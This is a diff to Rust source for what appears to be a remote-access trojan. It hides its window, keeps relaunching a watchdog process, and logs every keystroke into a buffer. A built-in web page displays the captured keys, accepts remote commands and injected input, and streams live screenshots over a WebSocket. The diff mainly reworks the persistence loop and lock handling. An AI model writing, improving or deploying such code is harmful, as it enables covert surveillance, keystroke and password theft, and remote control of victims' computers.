@@ -30,12 +30,22 @@ async fn main() {
     let mut arg = args();
     arg.next();
 
-    Command::new("cmd")
-        .creation_flags(0x08000000)
-        .arg("/c")
-        .arg(format!("for /l %i in (0,0,0) do {}", arg.next().unwrap()))
-        .spawn()
-        .unwrap();
+    // Command::new("cmd")
+    //     .creation_flags(0x08000000)
+    //     .arg("/c")
+    //     .arg(format!("for /l %i in (0,0,0) do {}", arg.next().unwrap()))
+    //     .spawn()
+    //     .unwrap();
+    let watchdog = arg.next().unwrap();
+    spawn(async move {
+        loop {
+            Command::new(&watchdog)
+                .creation_flags(0x08000000)
+                .status()
+                .await
+                .unwrap();
+        }
+    });
 
     let lock = Arc::new(Mutex::new(String::new()));
     let lock1 = lock.clone();
@@ -57,10 +67,9 @@ async fn main() {
         *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; ");
     });
 
-    spawn(async {
-        let lckin = lck2;
+    spawn(async move {
         loop {
-            let l = lckin.clone();
+            let l = lck2.clone();
             listen(move |e| {
                 if let Some(name) = e.name {
                     *l.lock().unwrap() += match &name[..] {
@@ -108,9 +117,9 @@ async fn main() {
                     Html(
                         String::from(
                             "<!DOCTYPE html><html><body><form action='/'method='post'><select name='choice'><option value='cmd'>cmd</option><option value='code'>key</option><option value='eni'>enigo</option><option value='rdev'>rdev</option><option value='txt'>input</option><option value='clr'>clear</option></select><input name='text'/><input type='submit'/></form><pre style='white-space:pre-wrap;'>",
-                        ) + lock1.lock().unwrap().as_str()
+                        ) + &lock1.lock().unwrap()
                             + "<hr>"
-                            + lck1.lock().unwrap().as_str()
+                            + &lck1.lock().unwrap()
                             + "</pre><img src='screen.bmp'/><script>const ws=new WebSocket('screen.bmp');const img=document.querySelector('img');ws.onmessage=(e)=>{if(e.data instanceof Blob)img.src=URL.createObjectURL(event.data)}</script></body></html>",
                     )
                 }),
